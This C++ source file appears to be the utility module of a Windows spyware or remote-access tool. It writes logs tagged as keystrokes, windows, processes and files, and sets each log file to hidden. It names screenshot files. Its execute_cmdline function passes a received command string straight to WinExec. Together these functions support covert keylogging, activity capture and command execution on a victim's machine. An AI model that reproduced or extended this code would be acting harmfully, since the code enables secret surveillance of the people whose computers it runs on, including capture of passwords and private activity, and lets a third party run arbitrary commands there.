
#include "utils.h"

namespace utils
{
	using namespace boost::gregorian;

	const wchar_t UTF_BOM = 0xfeff;

	wstring unique_id(int len)
	{
		boost::uuids::random_generator generator;
		boost::uuids::uuid id = generator();
		wstring temp = boost::lexical_cast<wstring>(id);
		return temp.substr(0, len);
	}

	wstring get_time()
	{
		return to_iso_extended_wstring(day_clock::local_day());
	}

	wstring get_unique_date_name()
	{
		wstring str = to_iso_wstring(day_clock::local_day());

		boost::uuids::random_generator generator;
		boost::uuids::uuid id = generator();
		wstring temp = boost::lexical_cast<wstring>(id);

		str += L"_" + temp.substr(0, 6);
		return str;
	}

	wstring screen_unique_name()
	{
		wstring time = get_unique_date_name();
		return time + L".jpg";
	}

	path screen_unique_path()
	{
		wstring name = screen_unique_name();
		path file(current_path().generic_wstring() + L"/" + name);
		return file;
	}

	path log_unique_path()
	{
		wstring name = unique_id(8) + L".log";
		path file(current_path().generic_wstring() + L"/" + name);
		return file;
	}

	void save_logfile(const vector<wstring> & data, int type)
	{
		path file = log_unique_path();
		null_wcodecvt wcodec(1);
		locale wloc(locale::classic(), &wcodec);
		wofstream out;

		try
		{
			out.imbue(wloc);
			out.open(file.generic_wstring(), ios::out | ios::binary);
			out << UTF_BOM;
			out << resolve_type(type) << wendl;
			out << get_time() << wendl << wendl;

			for (wstring line : data)
				out << line << wendl;
		}
		catch (runtime_error e) {}
		catch (...) {}

		out.close();
		SetFileAttributes(file.generic_wstring().c_str(), FILE_ATTRIBUTE_HIDDEN);
	}

	void save_logfile(const wstringstream & data, int type)
	{
		path file = log_unique_path();
		null_wcodecvt wcodec(1);
		locale wloc(locale::classic(), &wcodec);
		wofstream out;

		try
		{
			out.imbue(wloc);
			out.open(file.generic_wstring(), ios::out | ios::binary);
			out << UTF_BOM;
			out << resolve_type(type) << wendl;
			out << get_time() << wendl << wendl;
			out << data.rdbuf() << wendl;
		}

		catch (runtime_error e) {}
		catch (...) {}

		out.close();
		SetFileAttributes(file.generic_wstring().c_str(), FILE_ATTRIBUTE_HIDDEN);
	}

	void save_logfile(const path & file, const vector<wstring> & data, int type)
	{
		null_wcodecvt wcodec(1);
		locale wloc(locale::classic(), &wcodec);
		wofstream out;

		try
		{
			out.imbue(wloc);
			out.open(file.generic_wstring(), ios::out | ios::binary);
			out << UTF_BOM;
			out << resolve_type(type) << wendl;
			out << get_time() << wendl << wendl;

			for (wstring line : data)
				out << line << wendl;
		}

		catch (runtime_error e) {}
		catch (...) {}

		out.close();
		SetFileAttributes(file.generic_wstring().c_str(), FILE_ATTRIBUTE_HIDDEN);
	}

	void save_logfile(const path & file, const wstringstream & data, int type)
	{
		null_wcodecvt wcodec(1);
		locale wloc(locale::classic(), &wcodec);
		wofstream out;

		try
		{
			out.imbue(wloc);
			out.open(file.generic_wstring(), ios::out | ios::binary);
			out << UTF_BOM;
			out << resolve_type(type) << wendl;
			out << get_time() << wendl << wendl;
			out << data.rdbuf() << wendl;
		}

		catch (runtime_error e) {}
		catch (...) {}

		out.close();
		SetFileAttributes(file.generic_wstring().c_str(), FILE_ATTRIBUTE_HIDDEN);
	}

	void execute_cmdline(const vector<wstring> & line)
	{
		if (line.size() < 2) return;

		int visible = _wtoi(line[1].c_str());
		char buf[255];
		wcstombs(buf, line[0].c_str(), sizeof(buf));
		WinExec(buf, visible);
	}

	void message_box(const vector<wstring> & params)
	{
		if (params.size() < 2) return;

		MessageBoxW(nullptr, params[0].c_str(), params[1].c_str(), 0);
	}

	wstring resolve_type(int type)
	{
		wstring name;

		if (type == KEYS)
			name = L"[KEYS]";
		else if (type == WINDOWS)
			name = L"[WINDOWS]";
		else if (type == PROCESSES)
			name = L"[PROCESSES]";
		else if (type == FILES)
			name = L"[FILES]";

		return name;
	}

	null_wcodecvt::null_wcodecvt(size_t refs) : null_wcodecvt_base(refs) {}

	null_wcodecvt::result null_wcodecvt::do_out(mbstate_t&, const wchar_t * from, const wchar_t * from_end,
		const wchar_t *& from_next, char * to, char * to_end, char *& to_next) const
	{
		size_t len = (from_end - from) * sizeof(wchar_t);
		memcpy(to, from, len);
		from_next = from_end;
		to_next = to + len;
		return ok;
	}

	null_wcodecvt::result null_wcodecvt::do_in(mbstate_t&, const char * from, const char * from_end, 
		const char *& from_next, wchar_t * to, wchar_t * to_end, wchar_t *& to_next) const
	{
		size_t len = (from_end - from);
		memcpy(to, from, len);
		from_next = from_end;
		to_next = to + (len / sizeof(wchar_t));
		return ok;
	}

	null_wcodecvt::result null_wcodecvt::do_unshift(mbstate_t&, char* to, char*, char*& to_next) const
	{
		to_next = to;
		return noconv;
	}

	int null_wcodecvt::do_length(mbstate_t&, const char* from, const char* end, size_t max) const
	{
		return (int)((max < (size_t)(end - from)) ? max : (end - from));
	}

	bool null_wcodecvt::do_always_noconv() const throw()
	{
		return true;
	}

	int null_wcodecvt::do_encoding() const throw()
	{
		return sizeof(wchar_t);
	}

	int null_wcodecvt::do_max_length() const throw()
	{
		return sizeof(wchar_t);
	}

	wostream & wendl(wostream & out)
	{
		out.put(L'\r');
		out.put(L'\n');
		out.flush();
		return out;
	}

	string to_ascii(const wstring & wstr, char rep)
	{
		string str(wstr.size(), 0);

		use_facet<ctype<wchar_t> >(locale()).narrow(&wstr[0], &wstr[0] + wstr.size(), rep, &str[0]);
		return str;
	}
}